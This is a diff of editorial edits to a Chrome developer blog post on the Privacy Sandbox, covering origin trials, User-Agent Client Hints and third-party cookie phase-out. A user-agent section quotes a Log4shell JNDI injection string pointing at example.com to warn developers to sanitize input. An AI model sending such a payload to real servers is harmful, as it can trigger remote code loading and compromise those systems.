@@ -15,7 +15,7 @@ tags:
 ---
 
 Welcome to the 2021 wrap-up edition of **[Progress in the Privacy
-Sandbox](/tags/progress-in-the-privacy-sandbox/)** tracking the milestones on
+Sandbox](/tags/progress-in-the-privacy-sandbox/)**, tracking the milestones on
 the path to phasing out third-party cookies in Chrome and working towards a more
 private web. Normally, we share an overview of updates to the **[Privacy Sandbox
 timeline](https://privacysandbox.com/timeline/)** along with news from across
@@ -56,11 +56,11 @@ Initial feedback is critical for validating and iterating on proposals.
 
 An **Intent to Experiment** is an optional step if we’d like to request an
 origin trial. Developers **can [sign up for the origin
-trial](/blog/origin-trials/)** of a feature, and then **test  it on your
-production site**. It's called an experiment because we have specific aspects of
-the feature we want to validate in real-world environments. Developers that can
-**test and share the results of those tests** provide valuable feedback to help
-iterate and evolve the feature.
+trial](/blog/origin-trials/)** of a feature, and then **test it in production**.
+It's called an experiment because we have specific aspects of the feature we
+want to validate in real-world environments. Developers that can **test and
+share the results of those tests** provide valuable feedback to help iterate and
+evolve the feature.
 
 An **Intent to Ship** is the final milestone which signals that a feature is now
 complete and ready for general availability. Once approved, the feature is
@@ -123,13 +123,13 @@ To find those areas:
    Hints](https://web.dev/migrate-to-ua-ch/).
 
 There is one December update to mention—if you are adopting User-Agent Client
-Hints then we have sent the **Intent to Ship to [enable delegating hints to
-other origins in
+Hints, we have sent the **Intent to Ship to [enable delegating hints to other
+origins in
 HTML](https://groups.google.com/a/chromium.org/g/blink-dev/c/JQ68cvYuiQU/m/S_33YSqxCwAJ)**
-via a `<meta>` tag, for example:
+via a `<meta>` tag. For example:
 
 ```html
-<meta name="accept-ch" content="sec-ch-ua-model=( https://foo.bar )">`
+<meta name="accept-ch" content="sec-ch-ua-model=( https://foo.bar )">
 ```
 
 If you're in an enthusiastic spring cleaning mood, you can also consider
@@ -143,14 +143,19 @@ value, is not guaranteed to be accurate or even provided. The recent [Log4j
 vulnerability, "Log4shell"](https://logging.apache.org/log4j/2.x/security.html)
 provides an example of this risk. A client that sets its user-agent string to
 include a value like `${jndi:ldap://example.com/file}` may be able to get a site
-to actively parse that on the server. It's critical that you treat user-agent in
-the same way as any other form of user input: sanitize and validate it before
-acting on the value.
+to actively parse that on the server.
+
+{% Aside 'caution' %}
+
+It's critical that you treat user-agent in the same way as any other form of
+user input: sanitize and validate it before acting on the value.
+
+{% endAside %}
 
 ### Cookie cataloguing
 
-Another traditional new year activity is to make sure you're happy you have a
-healthy number of cookies with quality ingredients. As we continue moving
+Another traditional new year activity is to make sure you're happy that you have
+a healthy number of cookies with quality ingredients. As we continue moving
 towards the phase out of third-party cookies, you should make sure you know
 which of your site's cookies will be affected. 2020 provided a headstart as it
 became necessary to [mark all cookies for cross-site or third-party
